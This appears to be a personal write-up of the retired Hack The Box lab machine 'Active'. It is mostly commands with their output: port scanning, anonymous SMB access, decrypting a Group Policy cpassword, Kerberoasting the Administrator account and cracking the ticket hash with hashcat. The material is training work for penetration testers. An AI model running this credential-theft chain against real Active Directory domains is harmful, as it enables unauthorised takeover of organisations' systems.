# Common Enumeration
## NMAP
All ports scan without service version and os detection.
```bash
❯ sudo nmap -p- --min-rate 10000 -oA nmap/active 10.10.10.100
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 09:40 PKT
Warning: 10.10.10.100 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.100
Host is up (0.28s latency).
Not shown: 50519 closed ports, 14995 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 71.45 seconds
```
Detected ports scan with service version and os detection.
```bash
❯ sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,9389,47001,49152,49153,49154,49157,49158,49169,49171,49180 -A -oA nmap/active_version 10.10.10.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 12:20 PKT
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-15 07:20:17Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
49169/tcp open   msrpc         Microsoft Windows RPC
49171/tcp closed unknown
49180/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/15%OT=53%CT=49171%CU=43664%PV=Y%DS=2%DC=T%G=Y%TM=60E
OS:FE1FF%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S
OS:%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O
OS:5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-15T07:21:24
|_  start_date: 2021-07-15T05:18:22

TRACEROUTE (using port 49180/tcp)
HOP RTT       ADDRESS
1   113.34 ms 10.10.14.1
2   115.30 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.88 seconds
```
## SMB Shares found
Found some SMB shares with anonymous/guest access.
```bash
❯ smbclient  -L 10.10.10.100
Enter WORKGROUP\kali's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```
## Found Groups.xml file
Found Groups.xml file in SMB `replication` share folder. 
```bash
❯ smbclient  -L 10.10.10.100
Enter WORKGROUP\kali's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/active_retired ❯ smbclient   \\\\10.10.10.100\\Replication
Enter WORKGROUP\kali's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  active.htb                          D        0  Sat Jul 21 15:37:44 2018
cd
                10459647 blocks of size 4096. 5725948 blocks available
smb: \> cd active.htb\
active.htb\DfsrPrivate\  active.htb\Policies\     active.htb\scripts\
smb: \> cd active.htb\
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 15:37:44 2018
  Policies                            D        0  Sat Jul 21 15:37:44 2018
  scripts                             D        0  Wed Jul 18 23:48:57 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\> cd Policies\
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 15:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 15:37:44 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  GPT.INI                             A       23  Thu Jul 19 01:46:06 2018
  Group Policy                        D        0  Sat Jul 21 15:37:44 2018
  MACHINE                             D        0  Sat Jul 21 15:37:44 2018
  USER                                D        0  Wed Jul 18 23:49:12 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd Group Policy\
cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd MACHINE\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  Microsoft                           D        0  Sat Jul 21 15:37:44 2018
  Preferences                         D        0  Sat Jul 21 15:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 23:53:45 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\> cd Preferences\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  Groups                              D        0  Sat Jul 21 15:37:44 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 15:37:44 2018
  ..                                  D        0  Sat Jul 21 15:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 01:46:06 2018

                10459647 blocks of size 4096. 5725948 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>
```
![[Pasted image 20210724110045.png]]
## Saved Groups.xml file to kali vm
![[Pasted image 20210724110451.png]]
## Found cpassword for user active.htb\\SVC_TGS
```bash
❯ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
## Cracked cpassword for user active.htb\\SVC_TGS
```bash
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18 (cracked cpassword)
```
## SVC_TGS domain user can request kerberos ticket(TGS) for any domain service
Domain user  SVC_TGS can request kerberos ticket(TGS) for any domain service, so requesting kerberos ticket(TGS) for any domain service running on domain controller.
```bash
 ❯ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:06:40.351723  2021-01-21 21:07:03.723783



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a2280caecef0388b24f49c69bbb13afe$7b87afb90cffef549a338dbce055bfab41edf6d7626aa48ac19911fd8a2ef30718ec00db32eda0260b9e00f1ecc0a8097dc8829349558bbba4e0f578231ae967ce1aa609baea6cbea6dfd2be4449a036c42a59fa5d080cfd36ec296ebac43d05bed8cc15a613abc7ce7af7ba1d3523403f482e9aff79690d107d14ae0b3f0257a8ca29daf816ad83fb995d6b247f98e1477a7dc2f416e78595df46a4c395278b577bfb9face687ebe119206679b40b39ecffa5221c0e38811eb804a7256590c063d5c609d7763448836c1ff06cd6bd53bbbdf2cd6687ccb6821aa8ba34bb5bc29841930fe50e235defc104c59372068b3a918a86e7564d94a43cc462e29cce64a031d64e71e47ad44d316a632a8d8d45f13f26c6b68e81f2f53f78a43ea784cfb403f56f389b44557be6e4515e6f3805a105e22157614be97e2eca7c1731ec934eb5c7cbfb7e4d2a197b25ee86b933a0d7b97fdc15f7a0192d2874499d59080d1e7b3da6cd4f85dd5e229f7425dd2156241a383d698f575ec0e2f500da622c88920e13188d128b3b1bed98329b3218821668317d608ebf688ee083c7502bc12fc4d7175347bf637b6f7a1d11b7be780226fa848ef5ed847cf6f45e1cd7bf9e12e20cc12cfef49d6895387ad8527472628e393fcd6694a42e06d086293f38170744e4c5c2c390e4bf3f7ee588d45d6e209dd7354095e73075515a97ff3ef981cd66c8b65a0f0492d017492dc13ec590b6a0fa52da9c24636aa07a7ce3589309e698f975065958e3964f018d4376b6eeee1b522733a56c7477e0bcda4bd1ab2951ea831507b754d004820d7ea59fdb5769f2b788abdbf078fe70e1d5e4eee577dda6f2591a7c3e45899d2f7ba5d83332f2122a53450b6758a7b89802cd11340ca5d503937c2dd4abd6961fa71a9e4b95f1a3d82fa2e1b140b9d0f40b6ea274ff428a843b56ac41467441c451f0c8eed3559297eb473665878a5856fc22906f7949a15c0521a33d7a0849cce7bea52a7f81bc7b5712ec68fc04bcae0cbdb76ad82e7f61f17f98966543e4d5f68de5840fae3f08841a7a92df4c1470ed145943957585f8124aa702a5f2729c1ed75e90db561cebb9a81a3a4e4edc7e5f7f6b2e7c289b4f44d352d02efb733c321ac252741db44545e6d724bb913ac3627943f30575e2b1654ae235c685c5ac51be4a22c62d52ed566c4174a9caf3a289acc53a2497733207275f63d0824a79e2778dd98a7828bfe30a6b405d818aa1
```
## Cracked the kerberos ticket(TGS) hash via hashcat
```bash
❯ nano hash_kerberos_ticket_TGS.hash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/active_retired 10s ❯ hashcat -m 13100  hash_kerberos_ticket_TGS.hash /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
hashcat (v6.1.1) starting...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a2280caecef0388b24f49c69bbb13afe$7b87afb90cffef549a338dbce055bfab41edf6d7626aa48ac19911fd8a2ef30718ec00db32eda0260b9e00f1ecc0a8097dc8829349558bbba4e0f578231ae967ce1aa609baea6cbea6dfd2be4449a036c42a59fa5d080cfd36ec296ebac43d05bed8cc15a613abc7ce7af7ba1d3523403f482e9aff79690d107d14ae0b3f0257a8ca29daf816ad83fb995d6b247f98e1477a7dc2f416e78595df46a4c395278b577bfb9face687ebe119206679b40b39ecffa5221c0e38811eb804a7256590c063d5c609d7763448836c1ff06cd6bd53bbbdf2cd6687ccb6821aa8ba34bb5bc29841930fe50e235defc104c59372068b3a918a86e7564d94a43cc462e29cce64a031d64e71e47ad44d316a632a8d8d45f13f26c6b68e81f2f53f78a43ea784cfb403f56f389b44557be6e4515e6f3805a105e22157614be97e2eca7c1731ec934eb5c7cbfb7e4d2a197b25ee86b933a0d7b97fdc15f7a0192d2874499d59080d1e7b3da6cd4f85dd5e229f7425dd2156241a383d698f575ec0e2f500da622c88920e13188d128b3b1bed98329b3218821668317d608ebf688ee083c7502bc12fc4d7175347bf637b6f7a1d11b7be780226fa848ef5ed847cf6f45e1cd7bf9e12e20cc12cfef49d6895387ad8527472628e393fcd6694a42e06d086293f38170744e4c5c2c390e4bf3f7ee588d45d6e209dd7354095e73075515a97ff3ef981cd66c8b65a0f0492d017492dc13ec590b6a0fa52da9c24636aa07a7ce3589309e698f975065958e3964f018d4376b6eeee1b522733a56c7477e0bcda4bd1ab2951ea831507b754d004820d7ea59fdb5769f2b788abdbf078fe70e1d5e4eee577dda6f2591a7c3e45899d2f7ba5d83332f2122a53450b6758a7b89802cd11340ca5d503937c2dd4abd6961fa71a9e4b95f1a3d82fa2e1b140b9d0f40b6ea274ff428a843b56ac41467441c451f0c8eed3559297eb473665878a5856fc22906f7949a15c0521a33d7a0849cce7bea52a7f81bc7b5712ec68fc04bcae0cbdb76ad82e7f61f17f98966543e4d5f68de5840fae3f08841a7a92df4c1470ed145943957585f8124aa702a5f2729c1ed75e90db561cebb9a81a3a4e4edc7e5f7f6b2e7c289b4f44d352d02efb733c321ac252741db44545e6d724bb913ac3627943f30575e2b1654ae235c685c5ac51be4a22c62d52ed566c4174a9caf3a289acc53a2497733207275f63d0824a79e2778dd98a7828bfe30a6b405d818aa1:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...818aa1
Time.Started.....: Sat Jul 24 12:05:47 2021 (9 secs)
Time.Estimated...: Sat Jul 24 12:05:56 2021 (0 secs)
Guess.Base.......: File (/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1085.4 kH/s (9.60ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10551296/14344385 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> TUGGIE

Started: Sat Jul 24 12:05:39 2021
Stopped: Sat Jul 24 12:05:58 2021
```
![[Pasted image 20210724120911.png]]








